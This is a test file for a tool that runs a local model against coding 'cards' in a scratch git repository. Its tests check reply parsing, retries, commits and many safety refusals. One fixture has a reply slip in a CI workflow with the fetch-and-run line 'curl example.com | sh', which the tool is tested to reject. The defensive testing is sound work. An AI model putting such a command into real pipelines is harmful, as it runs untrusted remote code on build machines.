// The card driver, run for real: a scratch git repository, the tool as a child process, and a
// stand-in for the model runner that answers as the runner does (/api/version, /api/show, /api/ps,
// and /api/chat as lines of JSON with the counts on the last).
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

vi.setConfig({ testTimeout: 60_000 });

const CLI = fileURLToPath(new URL('../card-run.mjs', import.meta.url));
const F = '```';
const CARD = 'docs/plan/phase-9-demo/cards/D1-add.md';
const CHECKS =
  'grep -q "export const sum" src/sum.ts || { echo "sum.ts has no sum"; exit 1; }\n' +
  'grep -q "const five = 5" src/math.ts || { echo "math.ts has no five"; exit 1; }';

const card = ({ level = 'T', run = CHECKS, files = null, read = null, goal = null } = {}) =>
  [
    '# Card D1-add: the sum',
    '',
    `Level: ${level}. Window: 16,000. Needs: none.`,
    '',
    '## Goal',
    '',
    goal ?? 'The sum exists, and `math.ts` has a five.',
    '',
    '## Read first',
    '',
    read ?? '- `src/math.ts` lines 1-2: the style to follow.',
    '',
    '## Files',
    '',
    files ?? '- `src/sum.ts` (new)\n- `src/math.ts` lines 3-4',
    '',
    '## Steps',
    '',
    '1. Write `sum` in `src/sum.ts`.',
    '2. Add `five` after `four`.',
    '',
    '## Tests',
    '',
    'None to write.',
    '',
    '## Run',
    '',
    `${F}sh`,
    run,
    F,
    '',
    '## Audit',
    '',
    '- Read the diff. AUDIT-ONLY',
    '',
  ].join('\n');

const MATH =
  'export const one = 1;\nexport const two = 2;\nexport const three = 3;\nexport const four = 4;\n';
const LONG = Array.from({ length: 24 }, (_, i) => `export const n${i + 1} = ${i + 1};`).join('\n') + '\n';
const part = (n, ...content) => `### part ${n}\n${F}ts\n${content.join('\n')}\n${F}`;
const part1 = part(1, 'export const sum = (a: number, b: number) => a + b;');
const part2 = (...more) => part(2, 'export const three = 3;', 'export const four = 4;', ...more);
const GOOD = `${part1}\n\n${part2('export const five = 5;')}\n`;
const NO_FIVE = `${part1}\n\n${part2()}\n`;

let server;
let url;
let port;
/** What the stand-in runner was sent, what it answers next, and what it says of itself. */
const runner = {};
const reset = () =>
  Object.assign(runner, {
    requests: [],
    replies: [],
    window: null,
    version: '0.40.16',
    show: {},
    listed: (model) => model,
    silent: false,
  });

beforeAll(async () => {
  server = http.createServer((req, res) => {
    res.setHeader('content-type', 'application/json');
    const last = runner.requests.at(-1);
    if (req.url === '/api/version') return res.end(JSON.stringify({ version: runner.version }));
    if (req.url === '/api/ps') {
      const name = last && runner.listed(last.model);
      const models = name
        ? [{ name, model: name, context_length: runner.window ?? last.options.num_ctx }]
        : [];
      return res.end(JSON.stringify({ models }));
    }
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      if (req.url === '/api/show') return res.end(JSON.stringify(runner.show));
      const request = JSON.parse(body);
      runner.requests.push(request);
      if (runner.silent) return;
      const reply = runner.replies.shift() ?? { content: 'STOP: the test gave no reply' };
      if (reply.status) {
        res.statusCode = reply.status;
        return res.end(JSON.stringify({ error: reply.error }));
      }
      const line = (o) => res.write(`${JSON.stringify({ model: request.model, ...o })}\n`);
      const half = Math.ceil(reply.content.length / 2);
      if (reply.thinking)
        line({ message: { role: 'assistant', content: '', thinking: reply.thinking }, done: false });
      line({ message: { role: 'assistant', content: reply.content.slice(0, half) }, done: false });
      line({ message: { role: 'assistant', content: reply.content.slice(half) }, done: false });
      if (!reply.unfinished)
        line({
          message: { role: 'assistant', content: '' },
          done: true,
          done_reason: reply.doneReason ?? 'stop',
          prompt_eval_count: Math.ceil(JSON.stringify(request.messages).length / 4),
          eval_count: Math.ceil(reply.content.length / 4),
        });
      res.end();
    });
  });
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  port = server.address().port;
  url = `http://127.0.0.1:${port}`;
});
afterAll(() => {
  server.closeAllConnections();
  return new Promise((done) => server.close(done));
});

let home;
let dir;
let env;
const git = (...args) => execFileSync('git', args, { cwd: dir, env, encoding: 'utf8' }).trimEnd();
const put = (path, text) => {
  mkdirSync(dirname(join(dir, path)), { recursive: true });
  writeFileSync(join(dir, path), text);
};
const read = (path) => readFileSync(join(dir, path), 'utf8');
const commit = (message) => {
  git('add', '-A');
  git('commit', '-q', '-m', message);
};

beforeEach(() => {
  reset();
  home = mkdtempSync(join(tmpdir(), 'card-run-'));
  dir = join(home, 'repo');
  mkdirSync(dir);
  writeFileSync(join(home, 'gitconfig'), '');
  env = { ...process.env, GIT_CONFIG_GLOBAL: join(home, 'gitconfig'), GIT_CONFIG_NOSYSTEM: '1' };
  for (const k of [
    'CARD_MODEL',
    'CARD_RUNNER_URL',
    'OLLAMA_HOST',
    'NODE_USE_ENV_PROXY',
    'HTTP_PROXY',
    'http_proxy',
  ])
    delete env[k];
  for (const who of ['AUTHOR', 'COMMITTER']) {
    env[`GIT_${who}_NAME`] = 'Test';
    env[`GIT_${who}_EMAIL`] = 'test@example.com';
  }
  git('init', '-q', '-b', 'main');
  put('.gitignore', '.card-runs/\n');
  put('docs/plan/implementer-rules.md', 'THE-RULES\n');
  put(CARD, card());
  put('src/math.ts', MATH);
  put('src/long.ts', LONG);
  commit('start');
});
afterEach(() => rmSync(home, { recursive: true, force: true }));

/** Starts the driver in the scratch repository. */
function start(args, more = {}) {
  const child = spawn(process.execPath, [CLI, ...args], { cwd: dir, env: { ...env, ...more } });
  let out = '';
  child.stdout.on('data', (c) => (out += c));
  child.stderr.on('data', (c) => (out += c));
  return { child, done: new Promise((done) => child.on('close', (code) => done({ code, out }))) };
}
const drive = (...args) => start(args).done;
const usual = () => [CARD, '--model', 'stub', '--url', url];
const run = (...more) => drive(...usual(), ...more);
const record = () => {
  const base = join(dir, '.card-runs', 'D1-add');
  const stamp = readdirSync(base).sort().at(-1);
  return {
    files: readdirSync(join(base, stamp)).sort(),
    read: (name) => readFileSync(join(base, stamp, name), 'utf8'),
  };
};
const result = () => JSON.parse(record().read('result.json'));
/** A card with other sections, committed. */
const use = (changes, message = 'card') => {
  put(CARD, card(changes));
  commit(message);
};
/** Refused before the model is asked: exit 2, the reason, no request. */
const refused = async (args, words, more) => {
  const { code, out } = await start(args, more).done;
  expect(out).toContain(words);
  expect(code).toBe(2);
  expect(runner.requests).toHaveLength(0);
};

describe('a card whose reply is good', () => {
  it('is written to the files the card names, checked by the card’s commands, and left uncommitted', async () => {
    runner.replies = [{ content: `Here you are.\n\n${GOOD}\nBoth parts are done.` }];
    const head = git('rev-parse', 'HEAD');
    const { code, out } = await run();
    expect(out).toContain('the commands passed after 1 attempt(s)');
    expect(code).toBe(0);
    expect(read('src/sum.ts')).toBe('export const sum = (a: number, b: number) => a + b;\n');
    expect(read('src/math.ts')).toBe(`${MATH}export const five = 5;\n`);
    expect(git('status', '--short')).toBe(' M src/math.ts\n?? src/sum.ts');
    expect(git('rev-parse', 'HEAD')).toBe(head);
  });

  it('is asked for in one request that sets the window, has an over-long prompt refused, and asks for no thinking', async () => {
    runner.replies = [{ content: GOOD }];
    await run();
    expect(runner.requests).toHaveLength(1);
    const [request] = runner.requests;
    expect(request).toMatchObject({
      model: 'stub',
      stream: true,
      think: false,
      truncate: false,
      shift: false,
      keep_alive: '10m',
    });
    expect(request.tools).toBeUndefined();
    expect(request.options).toMatchObject({ num_ctx: 16384, temperature: 0.2, seed: 1 });
    // One new file and two lines to write again: far less than the window would hold.
    expect(request.options.num_predict).toBeGreaterThan(6000);
    expect(request.options.num_predict).toBeLessThan(8000);
    expect(request.messages.map((m) => m.role)).toEqual(['system', 'user']);
    expect(request.messages[0].content).toBe('THE-RULES');
    const user = request.messages[1].content;
    expect(user).toContain(
      '## src/math.ts, lines 1-2\nthe style to follow.\n\n1: export const one = 1;\n2: export const two = 2;',
    );
    expect(user).toContain(`${F}\nexport const three = 3;\nexport const four = 4;\n${F}`);
    expect(user).toContain('2. Add `five` after `four`.');
    expect(user).not.toContain('AUDIT-ONLY');
  });

  it('leaves a record of what was sent, what came back and what the commands printed', async () => {
    runner.replies = [{ content: GOOD }];
    await run();
    const r = record();
    expect(r.files).toEqual([
      'attempt-1-commands.log',
      'attempt-1-prompt.md',
      'attempt-1-reply.md',
      'before-commands.log',
      'result.json',
    ]);
    expect(r.read('before-commands.log')).toContain('sum.ts has no sum');
    expect(r.read('attempt-1-prompt.md')).toContain('THE-RULES\n\n---\n\n# What the card tells you to read');
    expect(r.read('attempt-1-reply.md')).toContain('export const five = 5;');
    expect(result()).toMatchObject({
      card: CARD,
      model: 'stub',
      window: 16384,
      wrote: ['src/sum.ts', 'src/math.ts'],
      outcome: 'passed',
      attempts: [{ outcome: 'the commands passed' }],
    });
    expect(existsSync(join(dir, '.card-runs', 'lock'))).toBe(false);
  });

  it('is committed on a work branch when asked, marked as not audited, with how the run went', async () => {
    git('switch', '-q', '-c', 'work/demo');
    runner.replies = [{ content: GOOD }];
    const { code } = await run('--commit');
    expect(code).toBe(0);
    expect(git('status', '--short')).toBe('');
    expect(git('log', '-1', '--format=%s')).toBe("Card D1-add: the implementer's attempt, not audited");
    const body = git('log', '-1', '--format=%b');
    expect(body).toContain('The auditor has not read this change.');
    expect(body).toMatch(/Attempt 1: the commands passed \(\d+ s, \d+ tokens read, \d+ written\)/);
    expect(body).not.toContain('stub');
    expect(git('show', '--stat', '--format=', 'HEAD')).toMatch(/src\/math\.ts[\s\S]*src\/sum\.ts/);
    expect(git('show', '--stat', '--format=', 'HEAD')).not.toContain('.card-runs');
  });

  it('is asked of a runner named as the runner’s own tools name it', async () => {
    for (const [name, value] of [
      ['OLLAMA_HOST', `0.0.0.0:${port}`],
      ['OLLAMA_HOST', `:${port}`],
      ['CARD_RUNNER_URL', `http://localhost:${port}`],
    ]) {
      runner.replies = [{ content: GOOD }];
      const { code, out } = await start([CARD, '--model', 'stub'], { [name]: value }).done;
      expect(out, value).toContain('the commands passed');
      expect(code, value).toBe(0);
      git('stash', '-u', '-q');
    }
  });

  it('is asked of the runner itself, not of a proxy the environment names', async () => {
    runner.replies = [{ content: GOOD }];
    // Both spellings: a machine that sets its own exceptions for local addresses would hide the difference.
    const proxied = {
      NODE_USE_ENV_PROXY: '1',
      HTTP_PROXY: 'http://127.0.0.1:9',
      http_proxy: 'http://127.0.0.1:9',
      NO_PROXY: '',
      no_proxy: '',
    };
    const { code, out } = await start(usual(), proxied).done;
    expect(out).toContain('the commands passed');
    expect(code).toBe(0);
  });

  it('may be a card with no part, which is its commands and asks no model', async () => {
    use({
      level: 'S',
      read: 'Nothing.',
      files: '- The list, which the commands write.',
      run: 'echo made > src/list.txt',
    });
    const { code, out } = await drive(CARD);
    expect(out).toContain('== D1-add: the commands passed');
    expect(code).toBe(0);
    expect(runner.requests).toHaveLength(0);
    expect(read('src/list.txt')).toBe('made\n');
    expect(result()).toMatchObject({
      model: null,
      outcome: 'passed',
      attempts: [{ outcome: 'the commands passed' }],
    });
  });
});

describe('a card whose first reply is not good', () => {
  it('is asked once more with what was wrong with the reply, and nothing is written from a bad reply', async () => {
    const lazy = `${part1}\n\n${part(2, '// ... rest unchanged', 'export const five = 5;')}`;
    runner.replies = [{ content: lazy }, { content: 'STOP: I cannot.' }];
    const { code, out } = await run();
    expect(out).toContain('part 2 leaves content out at its line 1');
    expect(code).toBe(3);
    expect(git('status', '--short')).toBe('');
    expect(runner.requests).toHaveLength(2);
    expect(runner.requests[1].options.seed).toBe(2);
    expect(runner.requests[1].messages[1].content).toContain(
      '# What went wrong last time\n\nYour last reply could not be used:\n- part 2 leaves content out at its line 1',
    );
  });

  it('passes when the second reply is good', async () => {
    runner.replies = [{ content: part1 }, { content: GOOD }];
    const { code, out } = await run();
    expect(out).toContain('part 2 is missing');
    expect(out).toContain('the commands passed after 2 attempt(s)');
    expect(code).toBe(0);
    expect(read('src/math.ts')).toBe(`${MATH}export const five = 5;\n`);
  });

  it('is asked once more with the end of the commands’ output when they fail, and shown the lines as they were', async () => {
    // The first attempt makes the range longer; the second must still go in over lines 3-4 of the file as it was.
    runner.replies = [{ content: `${part1}\n\n${part2('export const extra = 0;')}` }, { content: GOOD }];
    const { code } = await run();
    expect(code).toBe(0);
    const again = runner.requests[1].messages[1].content;
    expect(again).toContain(
      `These 2 lines, as they were before your first attempt:\n\n${F}\nexport const three = 3;\nexport const four = 4;\n${F}`,
    );
    expect(again).toContain('Your first attempt wrote this in their place:');
    expect(again).toContain('export const extra = 0;');
    expect(again).toContain(`They failed. The end of their output:\n\n${F}\nmath.ts has no five\n${F}`);
    expect(read('src/math.ts')).toBe(`${MATH}export const five = 5;\n`);
    expect(result().attempts.map((a) => a.outcome)).toEqual([
      'the commands failed (exit 1)',
      'the commands passed',
    ]);
  });

  it('keeps what the commands said when the next reply cannot be used', async () => {
    runner.replies = [{ content: NO_FIVE }, { content: 'nothing useful' }, { content: GOOD }];
    const { code } = await run('--attempts', '3');
    expect(code).toBe(0);
    const third = runner.requests[2].messages[1].content;
    expect(third).toContain('math.ts has no five');
    expect(third).toContain('Your last reply could not be used:\n- part 1 is missing');
    expect(third).toContain('Your first attempt wrote this');
  });

  it('goes back to the planner after two tries, with what was written left in the tree', async () => {
    runner.replies = [{ content: NO_FIVE }, { content: NO_FIVE }];
    const { code, out } = await run();
    expect(code).toBe(1);
    expect(out).toContain('not done (the commands failed)');
    expect(out).toContain('What the run wrote is left in the working tree for the planner.');
    expect(runner.requests).toHaveLength(2);
    expect(git('status', '--short')).toBe('?? src/sum.ts');
  });

  it('on a work branch is committed for the planner to read and taken out again, so that the card can be run once more', async () => {
    git('switch', '-q', '-c', 'work/demo');
    runner.replies = [{ content: NO_FIVE }, { content: NO_FIVE }];
    const failed = await run('--commit');
    expect(failed.code).toBe(1);
    expect(failed.out).not.toContain('git stash');
    expect(git('log', '--format=%s').split('\n')).toEqual([
      'Card D1-add: the failed attempt taken out again',
      'Card D1-add: a failed attempt, back to the planner',
      'start',
    ]);
    expect(git('status', '--short')).toBe('');
    expect(existsSync(join(dir, 'src/sum.ts'))).toBe(false);
    const body = git('log', '-1', '--format=%b', 'HEAD~1');
    expect(body).toContain('Attempt 2: the commands failed (exit 1)');
    expect(body).toContain('How it ended:\n  math.ts has no five');
    expect(git('show', '--stat', '--format=', 'HEAD~1')).toContain('src/sum.ts');
    runner.replies = [{ content: GOOD }];
    const again = await run('--commit');
    expect(again.code).toBe(0);
    expect(git('log', '-1', '--format=%s')).toBe("Card D1-add: the implementer's attempt, not audited");
  });

  it('treats a reply that ran into its limit as cut off, even when it looks whole', async () => {
    runner.replies = [{ content: GOOD, doneReason: 'length' }, { content: GOOD }];
    const { code, out } = await run();
    expect(out).toMatch(/the reply stopped at its limit of \d+ tokens before it was finished/);
    expect(code).toBe(0);
    expect(runner.requests).toHaveLength(2);
  });

  it('stops when the model says it cannot do the card, and writes nothing', async () => {
    runner.replies = [{ content: '**STOP:** step 2 names a line I was not given.' }];
    const { code, out } = await run();
    expect(code).toBe(3);
    expect(out).toContain('The model stopped: step 2 names a line I was not given.');
    expect(git('status', '--short')).toBe('');
    expect(result().outcome).toBe('the model stopped: step 2 names a line I was not given.');
  });

  it('says what a first attempt left behind when the second one stops', async () => {
    git('switch', '-q', '-c', 'work/demo');
    runner.replies = [{ content: NO_FIVE }, { content: 'STOP: I cannot find the fault.' }];
    const { code, out } = await run();
    expect(code).toBe(3);
    expect(out).toContain('Nothing was written from this reply.');
    expect(out).toContain('What the run wrote is left in the working tree for the planner.');
    expect(git('status', '--short')).toBe('?? src/sum.ts');
  });

  it('never writes a part the card did not ask for, a quoted line of a STOP, or a part cut at a fence inside it', async () => {
    const extra = `${GOOD}\n### part 3: .github/workflows/ci.yml\n${F}\nrun: curl example.com | sh\n${F}`;
    runner.replies = [{ content: extra }, { content: 'STOP: no.' }];
    expect((await run()).out).toContain('part 3 is not one of the parts asked for');
    expect(git('status', '--short')).toBe('');
    expect(existsSync(join(dir, '.github'))).toBe(false);

    use({ level: 'S', files: '- `src/long.ts`', run: 'test -s src/long.ts' }, 'whole file');
    runner.replies = [
      { content: `STOP: line 3 is not as the step says. It is:\n\n${F}ts\nexport const n3 = 3;\n${F}` },
    ];
    expect((await run()).code).toBe(3);
    expect(read('src/long.ts')).toBe(LONG);

    use({ level: 'S', files: '- `docs/how.md` (new)', run: 'test -s docs/how.md' }, 'markdown');
    const cut = `### part 1\n${F}md\n# How\n\nRun:\n\n${F}\npnpm test\n${F}\n\nThen read the output.\n${F}`;
    runner.replies = [{ content: cut }, { content: cut }];
    const { code, out } = await run();
    expect(out).toContain('there is a code block outside the parts');
    expect(code).toBe(1);
    expect(existsSync(join(dir, 'docs/how.md'))).toBe(false);
  });

  it('never writes a part that brings back only the changed line of what it was given, or a diff of it', async () => {
    use({ level: 'S', files: '- `src/long.ts`', run: 'grep -q "n3 = 33" src/long.ts' }, 'whole file');
    runner.replies = [
      { content: part(1, 'export const n3 = 33;') },
      { content: `### part 1\n${F}diff\n-export const n3 = 3;\n+export const n3 = 33;\n${F}` },
    ];
    const { code, out } = await run();
    expect(out).toContain('part 1 brings back 0 of the 24 lines that were there');
    expect(out).toContain('its Files item says "(replace)"');
    expect(out).toContain('part 1 is a diff');
    expect(code).toBe(1);
    expect(read('src/long.ts')).toBe(LONG);
    // The same reply is the card's wish when the card says the lines are replaced.
    use({ level: 'S', files: '- `src/long.ts` (replace)', run: 'grep -q "n3 = 33" src/long.ts' }, 'replace');
    runner.replies = [{ content: part(1, 'export const n3 = 33;') }];
    expect((await run()).code).toBe(0);
    expect(read('src/long.ts')).toBe('export const n3 = 33;\n');
  });

  it('gives up when the second attempt, with the first one shown, no longer fits the window', async () => {
    const huge = Array.from({ length: 400 }, (_, i) => `export const filler${i} = '${'x'.repeat(70)}';`);
    runner.replies = [{ content: `${part(1, ...huge)}\n\n${part2('export const five = 5;')}` }];
    const { code, out } = await run();
    expect(out).toContain('attempt 2: not sent.');
    expect(out).toContain('not done (the second attempt did not fit the window)');
    expect(code).toBe(1);
    expect(runner.requests).toHaveLength(1);
  });
});

describe('a card that is not run', () => {
  it('when the working tree has changes, even ones git is told not to show', async () => {
    put('src/other.ts', 'export {};\n');
    await refused(usual(), 'the working tree has changes');
    git('config', 'status.showUntrackedFiles', 'no');
    await refused(usual(), 'the working tree has changes');
  });

  it('when no model is named, or the address is not one, or is another machine’s and that was not said', async () => {
    await refused([CARD, '--url', url], 'name the model');
    await refused([CARD, '--model', 'stub', '--url', 'http://['], 'is not the address of a runner');
    await refused([CARD, '--model', 'stub', '--url', 'http://192.0.2.7:11434'], 'is not on this machine');
    await refused(
      [CARD, '--model', 'stub', '--url', `http://127.0.0.1:${port}@example.invalid/`],
      'is not on this machine',
    );
  });

  it('when the model would run on another machine through the local runner', async () => {
    for (const model of ['stub:cloud', 'stub:480b-cloud'])
      await refused(
        [CARD, '--model', model, '--url', url],
        `the model ${model} does not run on this machine`,
      );
    runner.show = { remote_host: 'https://models.example.invalid', remote_model: 'stub' };
    await refused(usual(), 'on to https://models.example.invalid');
    runner.replies = [{ content: GOOD }];
    expect((await run('--allow-remote')).code).toBe(0);
  });

  it('when the card is the frontier model’s, does not exist, is in no repository, or an option is wrong', async () => {
    use({ level: 'X' }, 'level');
    await refused(usual(), 'a level X card is written by the frontier model');
    await refused(['docs/plan/phase-9-demo/cards/D1-gone.md', '--model', 'stub'], 'does not exist');
    writeFileSync(join(home, 'D1-loose.md'), card());
    await refused([join(home, 'D1-loose.md'), '--dry-run'], 'is not in a git repository');
    for (const [option, words] of [
      [['--force'], 'unknown option --force'],
      [['--attempts', '0'], '--attempts needs 1 or more'],
      [['--attempts', '1.5'], '--attempts needs a whole number'],
      [['--seed', 'x'], '--seed needs a whole number'],
      [['--window', '100'], '--window needs 1024 or more'],
      [['--keep-alive', 'soon'], '--keep-alive needs seconds (300) or a time (10m)'],
    ])
      await refused([...usual(), ...option], words);
  });

  it('when a commit is asked for anywhere but on a work branch', async () => {
    await refused([...usual(), '--commit'], '--commit is for a work branch (work/<unit>), and this is main');
    for (const name of ['work', 'workx/y', 'Work/y']) {
      git('switch', '-q', '-c', name);
      await refused(
        [...usual(), '--commit'],
        `--commit is for a work branch (work/<unit>), and this is ${name}`,
      );
    }
    git('switch', '-q', '--detach');
    await refused([...usual(), '--commit'], 'and this is no branch');
  });

  it('when its tests pass before any code is written, or its commands write before they fail', async () => {
    use({ run: 'true' }, 'run');
    await refused(usual(), "The card's commands pass before any code is written");
    use({ run: 'echo x > src/made.txt\nfalse' }, 'writes first');
    await refused(usual(), 'The commands changed files before they failed');
  });

  it('when the lines it names are no longer the lines they were, whatever else the card said since', async () => {
    put('src/math.ts', `// a new first line\n${MATH}`);
    commit('math moved');
    await refused(usual(), 'src/math.ts lines 1-2 are not the lines they were when the card named them');
    // Rewording the card does not make an old count of lines a new one.
    use({ goal: 'The sum exists, and `math.ts` has a five, as before.' }, 'reworded');
    await refused(usual(), 'src/math.ts lines 1-2 are not the lines they were');
    // The planner says the numbers still hold, and the reply goes in over what is at those lines now.
    runner.replies = [{ content: GOOD }];
    await drive(...usual(), '--ranges-checked', '--no-first-run');
    expect(runner.requests).toHaveLength(1);
    expect(read('src/math.ts')).toBe(
      '// a new first line\nexport const one = 1;\nexport const three = 3;\nexport const four = 4;\nexport const five = 5;\nexport const four = 4;\n',
    );
  });

  it('for lines it only reads as for lines it changes, and not for a change elsewhere in the file', async () => {
    use({ files: '- `src/sum.ts` (new)', run: 'test -s src/sum.ts' }, 'reads a range');
    put('src/math.ts', MATH.replace('two = 2', 'two = 22'));
    commit('line 2 changed');
    await refused(usual(), 'src/math.ts lines 1-2 are not the lines they were');

    use(
      { read: 'Nothing.', files: '- `src/math.ts` lines 3-4', run: 'grep -q five src/math.ts' },
      'changes a range',
    );
    put('src/math.ts', `// first\n${MATH}`);
    commit('moved');
    await refused(usual(), 'src/math.ts lines 3-4 are not the lines they were');

    // A line added below the named lines moves none of them.
    put('src/math.ts', `${MATH}export const nine = 9;\n`);
    use(
      { read: 'Nothing.', files: '- `src/math.ts` lines 3-4 (replace)', run: 'grep -q five src/math.ts' },
      'named again',
    );
    put('src/math.ts', `${MATH}export const nine = 9;\nexport const ten = 10;\n`);
    commit('a line below');
    runner.replies = [
      { content: part(1, 'export const three = 3;', 'export const four = 4;', 'export const five = 5;') },
    ];
    expect((await run()).code).toBe(0);
  });

  it('even when the card breaks the line between a path and its lines', async () => {
    use(
      { read: 'Nothing.', files: '- `src/math.ts`\n  lines 3-4', run: 'grep -q five src/math.ts' },
      'wrapped',
    );
    put('src/math.ts', `// first\n${MATH}`);
    commit('moved');
    await refused(usual(), 'src/math.ts lines 3-4 are not the lines they were');
  });

  it('when a file it names is a link, is reached through one, is a folder, is git’s own or is ignored', async () => {
    symlinkSync('math.ts', join(dir, 'src/alias.ts'));
    use({ read: '- `src/alias.ts` lines 1-2.' }, 'a link');
    await refused(usual(), 'src/alias.ts is a link; a card names the file itself');

    put('.gitignore', '.card-runs/\nprivate/\n');
    put('private/notes.ts', 'export const key = "SECRET";\n');
    symlinkSync('private', join(dir, 'shared'));
    use({ read: '- `shared/notes.ts` lines 1-1.' }, 'through a link');
    await refused(usual(), 'shared/notes.ts is reached through a link');
    use({ read: '- `private/notes.ts` lines 1-1.' }, 'ignored');
    await refused(usual(), 'private/notes.ts is ignored by git');

    use({ files: '- `src/sum.ts` (new)\n- `src`' }, 'a folder');
    await refused(usual(), 'Files: src is not a file');
    use({ read: '- `.git/config` lines 1-3.' }, 'git’s own');
    await refused(usual(), '.git/config must be a plain path inside the repository');
  });

  it('when a new file would go through a link, into an ignored place, or where something is', async () => {
    mkdirSync(join(home, 'outside'));
    symlinkSync(join(home, 'outside', 'escaped.ts'), join(dir, 'src/sum.ts'));
    commit('a link to nothing');
    await refused(usual(), 'src/sum.ts is there already');
    expect(existsSync(join(home, 'outside', 'escaped.ts'))).toBe(false);
    git('rm', '-q', 'src/sum.ts');

    symlinkSync(join(home, 'outside'), join(dir, 'out'));
    use({ files: '- `out/sum.ts` (new)\n- `src/math.ts` lines 3-4' }, 'a linked folder');
    await refused(usual(), 'out/sum.ts would be written through a link');

    put('.gitignore', '.card-runs/\nbuild/\n');
    use({ files: '- `build/sum.ts` (new)\n- `src/math.ts` lines 3-4' }, 'an ignored folder');
    await refused(usual(), 'build/sum.ts would be ignored by git');
    use({ files: '- `.card-runs/D1-add/x.ts` (new)\n- `src/math.ts` lines 3-4' }, 'the record');
    await refused(usual(), '.card-runs/D1-add/x.ts would be ignored by git');
    expect(readdirSync(join(home, 'outside'))).toEqual([]);
  });

  it('when the record of runs would not be ignored, the rules are a link, or another run is at work', async () => {
    put('.gitignore', '');
    commit('not ignored');
    await refused(usual(), 'add ".card-runs/" to .gitignore');
    put('.gitignore', '.card-runs/\n');
    commit('ignored again');
    mkdirSync(join(dir, '.card-runs'));
    writeFileSync(join(dir, '.card-runs', 'lock'), String(process.pid));
    await refused(usual(), `another run is at work in this checkout (process ${process.pid})`);
    rmSync(join(dir, '.card-runs'), { recursive: true });

    writeFileSync(join(home, 'other-rules.md'), 'OUTSIDE\n');
    rmSync(join(dir, 'docs/plan/implementer-rules.md'));
    symlinkSync(join(home, 'other-rules.md'), join(dir, 'docs/plan/implementer-rules.md'));
    commit('rules are a link');
    await refused(usual(), 'docs/plan/implementer-rules.md is a link');
  });

  it('when what it asks does not fit the window, before any command is run', async () => {
    put('src/wide.ts', Array.from({ length: 190 }, (_, i) => `// ${i} ${'w'.repeat(190)}`).join('\n') + '\n');
    use({ read: '- `src/wide.ts`, all of it (190 lines).' }, 'wide');
    await refused(usual(), 'does not fit its window');
    expect(existsSync(join(dir, '.card-runs'))).toBe(false);
    const dry = await drive(CARD, '--dry-run');
    expect(dry.out).toMatch(/come to about \d+ tokens; a window of 16384 takes 9830/);
    expect(dry.code).toBe(2);
    expect((await drive(CARD, '--dry-run', '--window', '32768')).code).toBe(0);
  });

  it('but is shown, with what it comes to, on a dry run that asks the model nothing', async () => {
    put('src/other.ts', 'export {};\n');
    const { code, out } = await drive(CARD, '--dry-run');
    expect(code).toBe(0);
    expect(out).toMatch(
      /D1-add: 2 part\(s\), 1 thing\(s\) to read\.\nThe prompt comes to between \d+ and \d+ tokens/,
    );
    expect(out).toContain('--- the rules ---\n\nTHE-RULES');
    expect(out).toContain('### part 1\n### part 2');
    expect(runner.requests).toHaveLength(0);
    expect(existsSync(join(dir, '.card-runs'))).toBe(false);
  });
});

describe('the card’s commands', () => {
  it('are not run first for a card whose tests the model does not have to make pass', async () => {
    use({ level: 'S', run: 'true' }, 'level S');
    runner.replies = [{ content: GOOD }];
    const { code } = await run();
    expect(code).toBe(0);
    expect(runner.requests).toHaveLength(1);
    expect(record().files).not.toContain('before-commands.log');
  });

  it('stop at the first that fails', async () => {
    use({ level: 'S', run: 'false\ntrue' }, 'first fails');
    runner.replies = [{ content: GOOD }];
    const { code, out } = await run('--attempts', '1');
    expect(out).toContain('not done (the commands failed)');
    expect(code).toBe(1);
  });

  it('are stopped, with everything they started, when they take too long or the run is interrupted', async () => {
    use({ level: 'S', run: 'sleep 31.4159\necho after' }, 'slow');
    runner.replies = [{ content: GOOD }];
    const began = Date.now();
    const late = await run('--attempts', '1', '--command-timeout', '0.02');
    expect(late.out).toContain('(stopped after 0.02 minutes)');
    expect(late.code).toBe(1);
    expect(Date.now() - began).toBeLessThan(20_000);
    expect(spawnSync('pgrep', ['-f', 'sleep 31.4159']).status).toBe(1);
    git('stash', '-u', '-q');

    runner.replies = [{ content: GOOD }];
    const going = start(usual());
    await vi.waitFor(() => expect(spawnSync('pgrep', ['-f', 'sleep 31.4159']).status).toBe(0), {
      timeout: 20_000,
    });
    going.child.kill('SIGTERM');
    const { code, out } = await going.done;
    expect(code).toBe(143);
    expect(out).toContain('Interrupted. Left in the working tree: src/sum.ts, src/math.ts.');
    expect(result().outcome).toBe('interrupted');
    expect(spawnSync('pgrep', ['-f', 'sleep 31.4159']).status).toBe(1);
    expect(existsSync(join(dir, '.card-runs', 'lock'))).toBe(false);
  });
});

describe('what a commit takes in', () => {
  beforeEach(() => git('switch', '-q', '-c', 'work/demo'));

  it('is never what git ignored when the run began', async () => {
    put('.gitignore', '.card-runs/\nsecret.env\n');
    put('secret.env', 'TOKEN=not-for-the-branch\n');
    use({ level: 'S', read: 'Nothing.', files: '- `.gitignore`', run: 'true' }, 'changes .gitignore');
    runner.replies = [{ content: `### part 1\n${F}\n.card-runs/\n${F}` }];
    const { code, out } = await run('--commit');
    expect(out).toContain('Not committed: git no longer ignores secret.env, which it did when the run began');
    expect(code).toBe(1);
    expect(git('log', '-1', '--format=%s')).toBe('changes .gitignore');
  });

  it('is never the record of the run, when a reply stops git ignoring it', async () => {
    use(
      { level: 'S', read: 'Nothing.', files: '- `.gitignore` (replace)', run: 'true' },
      'changes .gitignore',
    );
    runner.replies = [{ content: `### part 1\n${F}\nnode_modules/\n${F}` }];
    const { code, out } = await run('--commit');
    expect(out).toContain('Not committed: git no longer ignores .card-runs/');
    expect(code).toBe(1);
    expect(git('log', '-1', '--format=%s')).toBe('changes .gitignore');
  });

  it('is nothing when the checkout moved to another branch during the run', async () => {
    use({ level: 'S', run: 'git switch -q -c elsewhere' }, 'moves');
    runner.replies = [{ content: GOOD }];
    const { code, out } = await run('--commit');
    expect(out).toContain('Not committed: the checkout moved from work/demo during the run');
    expect(code).toBe(1);
    expect(git('log', '-1', '--format=%s', 'work/demo')).toBe('moves');
